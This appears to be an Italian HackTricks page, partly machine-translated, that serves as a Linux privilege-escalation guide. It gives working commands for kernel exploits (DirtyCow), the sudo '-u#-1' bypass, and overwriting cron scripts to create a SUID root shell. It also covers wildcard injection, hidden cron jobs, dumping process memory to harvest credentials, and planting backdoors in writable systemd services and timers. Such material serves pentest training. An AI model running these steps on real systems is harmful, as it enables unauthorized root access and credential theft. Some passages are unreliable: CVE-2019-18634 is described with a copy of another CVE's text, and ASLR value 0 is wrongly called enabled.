# Linux Privilege Escalation

<details>

<summary><strong>Impara l'hacking di AWS da zero a esperto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Altri modi per supportare HackTricks:

* Se vuoi vedere la tua **azienda pubblicizzata su HackTricks** o **scaricare HackTricks in PDF** Controlla i [**PACCHETTI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione di [**NFT esclusivi**](https://opensea.io/collection/the-peass-family)
* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo Telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Condividi i tuoi trucchi di hacking inviando PR ai repository github di** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Informazioni di sistema

### Informazioni sul sistema operativo

Iniziamo ad acquisire conoscenze sul sistema operativo in esecuzione.
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Percorso

Se **hai i permessi di scrittura su una qualsiasi cartella all'interno della variabile `PATH`**, potresti essere in grado di dirottare alcune librerie o binari:
```bash
echo $PATH
```
### Informazioni sull'ambiente

Informazioni interessanti, password o chiavi API nelle variabili d'ambiente?
```bash
(env || set) 2>/dev/null
```
### Exploit del kernel

Controlla la versione del kernel e se esiste qualche exploit che può essere utilizzato per l'escalation dei privilegi.
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
Puoi trovare una buona lista di kernel vulnerabili e alcuni **exploit già compilati** qui: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) e [exploitdb sploits](https://github.com/offensive-security/exploitdb-bin-sploits/tree/master/bin-sploits).\
Altri siti dove puoi trovare alcuni **exploit compilati**: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Per estrarre tutte le versioni di kernel vulnerabili da quel sito web, puoi eseguire:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Gli strumenti che potrebbero aiutare nella ricerca di exploit del kernel sono:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (eseguire NEL vittima, controlla solo gli exploit per il kernel 2.x)

Ricerca sempre la versione del kernel su Google, potrebbe essere scritta in qualche exploit del kernel e così sarai sicuro che questo exploit sia valido.

### CVE-2016-5195 (DirtyCow)

Elevazione dei privilegi in Linux - Kernel Linux <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Versione di Sudo

Basato sulle versioni vulnerabili di sudo che appaiono in:
```bash
searchsploit sudo
```
Puoi verificare se la versione di sudo è vulnerabile utilizzando questo comando grep.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
#### sudo < v1.28

Da @sickrov

---

#### Introduzione

Questa sezione riguarda le vulnerabilità di sudo precedenti alla versione 1.28. Sudo è un programma di utilità per Unix-like che consente agli utenti di eseguire comandi come un altro utente, tipicamente l'utente root. Tuttavia, alcune versioni precedenti di sudo presentano vulnerabilità che possono essere sfruttate per ottenere privilegi di root non autorizzati.

---

#### Vulnerabilità di sudo < v1.28

Le versioni precedenti di sudo, fino alla versione 1.27, presentano diverse vulnerabilità che possono essere sfruttate per ottenere privilegi di root non autorizzati. Alcuni esempi di queste vulnerabilità includono:

- **CVE-2019-14287**: Questa vulnerabilità consente a un utente con privilegi di sudo di eseguire comandi come root anche se non è autorizzato a farlo. Per sfruttare questa vulnerabilità, l'utente deve essere elencato nel file sudoers con l'opzione "ALL" per il comando specifico.

- **CVE-2019-18634**: Questa vulnerabilità consente a un utente con privilegi di sudo di eseguire comandi come root anche se non è autorizzato a farlo. Per sfruttare questa vulnerabilità, l'utente deve essere elencato nel file sudoers con l'opzione "ALL" per il comando specifico.

---

#### Mitigazione

Per mitigare queste vulnerabilità, è consigliabile aggiornare sudo alla versione 1.28 o successiva. Inoltre, è importante limitare l'accesso agli utenti autorizzati nel file sudoers e non utilizzare l'opzione "ALL" per i comandi specifici, ma specificare solo i comandi necessari per l'utente autorizzato.

---

#### Riferimenti

- [CVE-2019-14287](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-14287)
- [CVE-2019-18634](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-18634)
```
sudo -u#-1 /bin/bash
```
### Verifica della firma Dmesg non riuscita

Controlla la macchina **smasher2 di HTB** per un **esempio** di come questa vulnerabilità potrebbe essere sfruttata
```bash
dmesg 2>/dev/null | grep "signature"
```
### Ulteriori enumerazioni di sistema

There are several other techniques that can be used to gather information about the system and potentially find vulnerabilities for privilege escalation.

#### Checking for SUID/SGID binaries

SUID (Set User ID) and SGID (Set Group ID) are special permissions that can be assigned to executable files. When a user runs an executable file with SUID or SGID permissions, the file is executed with the privileges of the file owner or group owner, respectively. This can be a potential security risk if there are any vulnerable SUID/SGID binaries on the system.

To check for SUID binaries, use the following command:

```bash
find / -perm -4000 2>/dev/null
```

To check for SGID binaries, use the following command:

```bash
find / -perm -2000 2>/dev/null
```

#### Checking for writable directories

Writable directories can be potential targets for privilege escalation. If a directory is writable by a privileged user or group, an attacker may be able to place a malicious file in that directory and execute it with elevated privileges.

To check for writable directories, use the following command:

```bash
find / -writable 2>/dev/null
```

#### Checking for world-writable files

World-writable files are files that can be modified by any user on the system. These files can be potential targets for privilege escalation if they are executed with elevated privileges.

To check for world-writable files, use the following command:

```bash
find / -perm -2 -type f 2>/dev/null
```

#### Checking for cron jobs

Cron jobs are scheduled tasks that run automatically at specified times or intervals. If a cron job is running with elevated privileges, an attacker may be able to modify the command executed by the cron job to gain elevated privileges.

To check for cron jobs, use the following command:

```bash
ls -la /etc/cron* /etc/at* 2>/dev/null
```

#### Checking for installed software and services

Installed software and services may have known vulnerabilities that can be exploited for privilege escalation. It is important to identify all installed software and services and check for any known vulnerabilities associated with them.

To check for installed software and services, use the following commands:

```bash
dpkg -l  # For Debian-based systems
rpm -qa  # For Red Hat-based systems
```

#### Checking for kernel vulnerabilities

The kernel is the core component of the operating system and any vulnerabilities in the kernel can potentially lead to privilege escalation. It is important to check for any known kernel vulnerabilities and apply patches or updates as necessary.

To check for kernel vulnerabilities, use the following command:

```bash
uname -a
```

#### Checking for open network ports

Open network ports can be potential entry points for attackers. It is important to identify all open network ports and ensure that only necessary services are listening on those ports.

To check for open network ports, use the following command:

```bash
netstat -tuln
```

These techniques can help in identifying potential vulnerabilities that can be exploited for privilege escalation. It is important to regularly perform system enumeration and vulnerability assessment to ensure the security of the system.
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Enumerare le possibili difese

### AppArmor

AppArmor è un sistema di sicurezza per il controllo degli accessi basato su profili. Viene utilizzato per limitare le azioni che un'applicazione può eseguire su un sistema Linux. I profili di AppArmor definiscono quali risorse possono essere accessibili da un'applicazione e quali azioni possono essere eseguite su di esse. Questo aiuta a prevenire potenziali attacchi di escalation dei privilegi, limitando le capacità delle applicazioni.
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity

Grsecurity è un kernel patch per Linux che fornisce una serie di funzionalità di sicurezza avanzate per proteggere il sistema operativo da attacchi e privilegi di escalation. Questa patch introduce una serie di meccanismi di difesa, come l'esecuzione casuale dello stack, la protezione del kernel da attacchi di overflow del buffer e la limitazione dei privilegi dei processi. Inoltre, Grsecurity offre anche funzionalità di auditing e monitoraggio per rilevare e prevenire attività sospette nel sistema. L'installazione di Grsecurity può aumentare significativamente la sicurezza del sistema operativo Linux e ridurre il rischio di compromissione.
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX

PaX è un insieme di patch del kernel Linux che mira a migliorare la sicurezza del sistema operativo. Queste patch introducono diverse tecniche di protezione, come l'esecuzione casuale dello stack, la protezione dell'heap, la protezione delle pagine di memoria e la prevenzione degli attacchi di buffer overflow.

L'obiettivo principale di PaX è prevenire l'esecuzione di codice malevolo nel sistema operativo, riducendo così il rischio di exploit e di escalation dei privilegi. Le patch di PaX possono essere utilizzate per proteggere il kernel Linux da attacchi di tipo zero-day e da altre vulnerabilità note.

PaX può essere utilizzato come parte di una strategia di hardening del sistema operativo, insieme ad altre misure di sicurezza come l'uso di firewall, l'implementazione di controlli di accesso e l'aggiornamento regolare del software.

Per abilitare PaX su un sistema Linux, è necessario applicare le patch appropriate al kernel e configurare correttamente le opzioni di sicurezza. Una volta abilitato, PaX fornirà una protezione aggiuntiva contro gli attacchi informatici e contribuirà a rendere il sistema operativo più sicuro.
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield

Execshield è una funzionalità di sicurezza implementata nel kernel Linux per proteggere il sistema da attacchi di esecuzione di codice arbitrario. Questa funzionalità è particolarmente utile per prevenire attacchi di escalation dei privilegi.

Quando Execshield è abilitato, il kernel applica diverse tecniche di protezione per rendere più difficile l'esecuzione di codice malevolo. Queste tecniche includono:

- Randomizzazione dello spazio degli indirizzi: il kernel assegna casualmente gli indirizzi di memoria ai processi, rendendo difficile per un attaccante prevedere la posizione esatta della memoria.
- Protezione dello stack: il kernel protegge lo stack dei processi da sovrascritture indesiderate, impedendo agli attaccanti di sfruttare vulnerabilità di buffer overflow.
- Protezione delle librerie condivise: il kernel protegge le librerie condivise da modifiche non autorizzate, impedendo agli attaccanti di sostituire le librerie con versioni malevole.

Per abilitare Execshield, è possibile utilizzare il comando `sysctl` per impostare i parametri del kernel corrispondenti. Ad esempio, è possibile impostare il parametro `kernel.randomize_va_space` su `2` per abilitare la randomizzazione dello spazio degli indirizzi.

È importante notare che Execshield non fornisce una protezione completa contro tutti gli attacchi di escalation dei privilegi, ma può essere un'aggiunta utile alle misure di sicurezza complessive del sistema. È consigliabile combinare Execshield con altre tecniche di hardening per ottenere una protezione più completa.
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux

SElinux (Security-Enhanced Linux) è un modulo di sicurezza per il kernel Linux che implementa un sistema di controllo degli accessi obbligatori (MAC) basato su etichette. Questo modulo fornisce un ulteriore livello di sicurezza per il sistema operativo, limitando i privilegi di accesso dei processi e delle risorse di sistema.

SElinux utilizza un sistema di etichettatura per assegnare un'etichetta di sicurezza a ogni oggetto del sistema, come file, processi e socket di rete. Queste etichette definiscono le regole di accesso per ogni oggetto, specificando quali processi possono accedere a quali risorse.

L'obiettivo principale di SElinux è quello di mitigare il rischio di attacchi di escalation dei privilegi, limitando la capacità di un utente o di un processo di accedere a risorse o eseguire azioni non autorizzate. SElinux può essere configurato per consentire solo le operazioni specifiche necessarie per il corretto funzionamento del sistema, riducendo così la superficie di attacco potenziale.

Per configurare SElinux, è possibile utilizzare il comando `setenforce` per impostare la modalità di enforcement (enforcing, permissive o disabled). In modalità enforcing, SElinux applica le regole di accesso definite, mentre in modalità permissive, SElinux registra solo le violazioni senza bloccare l'accesso. La modalità disabled disabilita completamente SElinux.

È importante notare che SElinux può essere un po' complesso da configurare correttamente, poiché richiede una conoscenza approfondita delle politiche di sicurezza e delle regole di accesso. Tuttavia, una volta configurato correttamente, SElinux può fornire un ulteriore livello di protezione per il sistema operativo Linux.
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR

ASLR (Address Space Layout Randomization) è una tecnica di sicurezza utilizzata per rendere più difficile l'esecuzione di attacchi di escalation dei privilegi. Con ASLR abilitato, gli indirizzi di memoria dei processi vengono casualmente posizionati nello spazio di indirizzamento virtuale, rendendo difficile per un attaccante prevedere la posizione esatta della memoria. Ciò rende più difficile sfruttare vulnerabilità di buffer overflow e altre vulnerabilità di memoria.

ASLR può essere abilitato nel kernel Linux impostando il valore appropriato nel file `/proc/sys/kernel/randomize_va_space`. Il valore 0 disabilita completamente ASLR, mentre il valore 2 abilita ASLR per tutti i processi. Il valore 1 abilita ASLR solo per i processi eseguiti come utente non privilegiato.

Per verificare se ASLR è abilitato, è possibile controllare il valore del file `/proc/sys/kernel/randomize_va_space`. Se il valore è 0 o 2, ASLR è abilitato. Se il valore è 1, ASLR è abilitato solo per i processi non privilegiati.

È importante notare che ASLR non è una soluzione completa per la sicurezza e può essere bypassato in alcune circostanze. Tuttavia, abilitare ASLR può rendere più difficile per un attaccante sfruttare vulnerabilità di escalation dei privilegi.
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Fuga da Docker

Se ti trovi all'interno di un container Docker, puoi provare a fuggire da esso:

{% content-ref url="docker-security/" %}
[docker-security](docker-security/)
{% endcontent-ref %}

## Unità

Controlla **cosa è montato e smontato**, dove e perché. Se qualcosa è smontato, puoi provare a montarlo e controllare se ci sono informazioni private.
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Software utili

Enumerare i binari utili
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Inoltre, controlla se **è installato un compilatore**. Questo è utile se hai bisogno di utilizzare qualche exploit del kernel, poiché è consigliabile compilarlo sulla macchina in cui lo utilizzerai (o su una simile).
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Software Vulnerabile Installato

Verifica la **versione dei pacchetti e dei servizi installati**. Potrebbe esserci una vecchia versione di Nagios (ad esempio) che potrebbe essere sfruttata per l'escalation dei privilegi...\
Si consiglia di verificare manualmente la versione del software installato più sospetto.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
Se hai accesso SSH alla macchina, puoi anche utilizzare **openVAS** per verificare la presenza di software obsoleto e vulnerabile installato all'interno della macchina.

{% hint style="info" %}
_Nota che questi comandi mostreranno molte informazioni che saranno per lo più inutili, pertanto è consigliabile utilizzare applicazioni come OpenVAS o simili che verifichino se una versione del software installato è vulnerabile a exploit conosciuti_
{% endhint %}

## Processi

Dai un'occhiata ai **processi in esecuzione** e verifica se qualche processo ha **più privilegi di quelli dovuti** (magari un tomcat in esecuzione come root?)
```bash
ps aux
ps -ef
top -n 1
```
Verifica sempre la presenza di [**debugger electron/cef/chromium in esecuzione**, potresti sfruttarli per ottenere privilegi elevati](electron-cef-chromium-debugger-abuse.md). **Linpeas** li rileva controllando il parametro `--inspect` nella riga di comando del processo.\
Inoltre, **controlla i tuoi privilegi sulle binarie dei processi**, potresti sovrascrivere qualcun altro.

### Monitoraggio dei processi

Puoi utilizzare strumenti come [**pspy**](https://github.com/DominicBreuker/pspy) per monitorare i processi. Questo può essere molto utile per identificare processi vulnerabili eseguiti frequentemente o quando vengono soddisfatte determinate condizioni.

### Memoria dei processi

Alcuni servizi di un server salvano **credenziali in chiaro nella memoria**.\
Normalmente avrai bisogno di **privilegi di root** per leggere la memoria dei processi che appartengono ad altri utenti, quindi questo è di solito più utile quando sei già root e vuoi scoprire ulteriori credenziali.\
Tuttavia, ricorda che **come utente normale puoi leggere la memoria dei processi di tua proprietà**.

{% hint style="warning" %}
Nota che al giorno d'oggi la maggior parte delle macchine **non consente ptrace per impostazione predefinita**, il che significa che non puoi eseguire il dump di altri processi che appartengono al tuo utente non privilegiato.

Il file _**/proc/sys/kernel/yama/ptrace\_scope**_ controlla l'accessibilità di ptrace:

* **kernel.yama.ptrace\_scope = 0**: tutti i processi possono essere debuggati, purché abbiano lo stesso uid. Questo è il modo classico in cui funzionava il ptracing.
* **kernel.yama.ptrace\_scope = 1**: solo un processo padre può essere debuggato.
* **kernel.yama.ptrace\_scope = 2**: solo l'amministratore può utilizzare ptrace, in quanto richiede la capacità CAP\_SYS\_PTRACE.
* **kernel.yama.ptrace\_scope = 3**: nessun processo può essere tracciato con ptrace. Una volta impostato, è necessario riavviare per abilitare nuovamente il tracciamento.
{% endhint %}

#### GDB

Se hai accesso alla memoria di un servizio FTP (ad esempio), puoi ottenere l'Heap e cercare all'interno le credenziali.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### Script GDB

{% code title="dump-memory.sh" %}
```bash
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
{% endcode %}

#### /proc/$pid/maps & /proc/$pid/mem

Per un dato ID di processo, **maps mostra come la memoria è mappata all'interno dello spazio degli indirizzi virtuali di quel processo**; mostra anche le **autorizzazioni di ogni regione mappata**. Il file pseudo **mem** **espone la memoria stessa dei processi**. Dal file **maps sappiamo quali regioni di memoria sono leggibili** e i loro offset. Utilizziamo queste informazioni per **cercare nel file mem e scaricare tutte le regioni leggibili** in un file.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` fornisce accesso alla memoria **fisica** del sistema, non alla memoria virtuale. Lo spazio degli indirizzi virtuali del kernel può essere accessibile utilizzando /dev/kmem.\
Di solito, `/dev/mem` è leggibile solo da **root** e dal gruppo **kmem**.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump per Linux

ProcDump è una versione per Linux del classico strumento ProcDump della suite di strumenti Sysinternals per Windows. Puoi trovarlo su [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Strumenti

Per eseguire il dump della memoria di un processo, puoi utilizzare:

* [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
* [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Puoi rimuovere manualmente i requisiti di root e eseguire il dump del processo di tua proprietà
* Script A.5 da [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (è richiesto il root)

### Credenziali dalla memoria del processo

#### Esempio manuale

Se scopri che il processo dell'autenticatore è in esecuzione:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Puoi eseguire il dump del processo (vedi le sezioni precedenti per trovare diversi modi per eseguire il dump della memoria di un processo) e cercare le credenziali all'interno della memoria:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

Lo strumento [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) **ruberà le credenziali in chiaro dalla memoria** e da alcuni **file ben noti**. Richiede i privilegi di root per funzionare correttamente.

| Funzionalità                                      | Nome del processo    |
| ------------------------------------------------- | -------------------- |
| Password GDM (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Connessioni FTP attive)                   | vsftpd               |
| Apache2 (Sessioni di autenticazione HTTP di base attive)         | apache2              |
| OpenSSH (Sessioni SSH attive - Uso di sudo)        | sshd:                |

#### Cerca Regexes/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Lavori pianificati/Cron jobs

Verifica se qualche lavoro pianificato è vulnerabile. Forse puoi approfittare di uno script eseguito da root (vulnerabilità di wildcard? puoi modificare file utilizzati da root? utilizzare symlink? creare file specifici nella directory utilizzata da root?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Percorso di Cron

Ad esempio, all'interno di _/etc/crontab_ è possibile trovare il percorso: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Nota come l'utente "user" ha privilegi di scrittura su /home/user_)

Se all'interno di questa crontab l'utente root cerca di eseguire un comando o uno script senza impostare il percorso. Ad esempio: _\* \* \* \* root overwrite.sh_\
Quindi, è possibile ottenere una shell di root utilizzando:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron utilizzando uno script con un carattere jolly (Wildcard Injection)

Se uno script viene eseguito da root e contiene un "**\***" all'interno di un comando, è possibile sfruttarlo per fare cose impreviste (come l'elevazione dei privilegi). Esempio:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**Se il carattere jolly è preceduto da un percorso come** _**/some/path/\***_ **, non è vulnerabile (anche** _**./\***_ **non lo è).**

Leggi la seguente pagina per ulteriori trucchi di sfruttamento dei caratteri jolly:

{% content-ref url="wildcards-spare-tricks.md" %}
[wildcards-spare-tricks.md](wildcards-spare-tricks.md)
{% endcontent-ref %}

### Sovrascrittura di script Cron e symlink

Se **puoi modificare uno script Cron** eseguito da root, puoi ottenere una shell molto facilmente:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Se lo script eseguito da root utilizza una **directory a cui hai pieno accesso**, potrebbe essere utile eliminare quella cartella e **creare un collegamento simbolico a un'altra cartella** che ospita uno script controllato da te.
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Cron job frequenti

Puoi monitorare i processi per cercare quelli che vengono eseguiti ogni 1, 2 o 5 minuti. Forse puoi approfittarne e ottenere privilegi elevati.

Ad esempio, per **monitorare ogni 0,1s per 1 minuto**, **ordinare per comandi meno eseguiti** ed eliminare i comandi che sono stati eseguiti di più, puoi fare:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Puoi anche utilizzare** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (questo monitorerà e elencherà ogni processo che viene avviato).

### Lavori cron invisibili

È possibile creare un lavoro cron **inserendo un ritorno a capo dopo un commento** (senza carattere di nuova riga), e il lavoro cron funzionerà. Esempio (nota il carattere di ritorno a capo):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## Servizi

### File _.service_ scrivibili

Verifica se puoi scrivere un file `.service`, se puoi, **puoi modificarlo** in modo che **esegua** il tuo **backdoor quando** il servizio viene **avviato**, **riavviato** o **arrestato** (potrebbe essere necessario attendere il riavvio della macchina).\
Ad esempio, crea il tuo backdoor all'interno del file .service con **`ExecStart=/tmp/script.sh`**

### Eseguibili di servizio scrivibili

Tieni presente che se hai **permessi di scrittura sui binari eseguiti dai servizi**, puoi cambiarli con backdoor in modo che quando i servizi vengono ri-eseguiti, i backdoor verranno eseguiti.

### systemd PATH - Percorsi relativi

Puoi vedere il PATH utilizzato da **systemd** con:
```bash
systemctl show-environment
```
Se scopri di poter **scrivere** in una delle cartelle del percorso, potresti essere in grado di **elevare i privilegi**. Devi cercare **percorsi relativi utilizzati nei file di configurazione dei servizi** come:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Quindi, crea un **eseguibile** con lo **stesso nome del percorso relativo binario** all'interno della cartella PATH di systemd in cui puoi scrivere, e quando il servizio viene richiesto di eseguire l'azione vulnerabile (**Start**, **Stop**, **Reload**), il tuo **backdoor verrà eseguito** (gli utenti non privilegiati di solito non possono avviare/fermare i servizi, ma verifica se puoi usare `sudo -l`).

**Per saperne di più sui servizi, consulta `man systemd.service`.**

## **Timers**

I **timers** sono file di unità di systemd il cui nome termina con `**.timer**` che controllano i file o gli eventi `**.service**`. I **timers** possono essere utilizzati come alternativa a cron in quanto hanno il supporto integrato per gli eventi di tempo del calendario e gli eventi di tempo monotono e possono essere eseguiti in modo asincrono.

È possibile enumerare tutti i timer con:
```bash
systemctl list-timers --all
```
### Timer scrivibili

Se puoi modificare un timer, puoi farlo eseguire alcuni esistenti di systemd.unit (come un `.service` o un `.target`)
```bash
Unit=backdoor.service
```
Nella documentazione è possibile leggere cosa è l'Unità:

> L'unità da attivare quando scade questo timer. L'argomento è un nome di unità, il cui suffisso non è ".timer". Se non specificato, questo valore viene impostato di default su un servizio che ha lo stesso nome dell'unità del timer, ad eccezione del suffisso. (Vedi sopra.) Si consiglia di dare lo stesso nome all'unità da attivare e all'unità del timer, ad eccezione del suffisso.

Pertanto, per sfruttare questa autorizzazione, è necessario:

* Trovare un'unità di systemd (come un `.service`) che **esegue un binario scrivibile**
* Trovare un'unità di systemd che **esegue un percorso relativo** e avere **privilegi di scrittura** sul **percorso di systemd** (per impersonare quell'eseguibile)

**Per saperne di più sui timer, consulta `man systemd.timer`.**

### **Abilitazione del Timer**

Per abilitare un timer è necessario avere privilegi di root ed eseguire:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Nota che il **timer** viene **attivato** creando un symlink ad esso in `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

I Socket di dominio Unix (UDS) consentono la **comunicazione tra processi** sulla stessa o su macchine diverse all'interno di modelli client-server. Utilizzano file di descrittore standard Unix per la comunicazione tra computer e vengono configurati tramite file `.socket`.

I socket possono essere configurati utilizzando file `.socket`.

**Per saperne di più sui socket, consulta `man systemd.socket`.** All'interno di questo file, è possibile configurare diversi parametri interessanti:

* `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Queste opzioni sono diverse ma una sintesi viene utilizzata per **indicare dove verrà ascoltato** il socket (il percorso del file socket AF\_UNIX, l'indirizzo IPv4/6 e/o il numero di porta da ascoltare, ecc.)
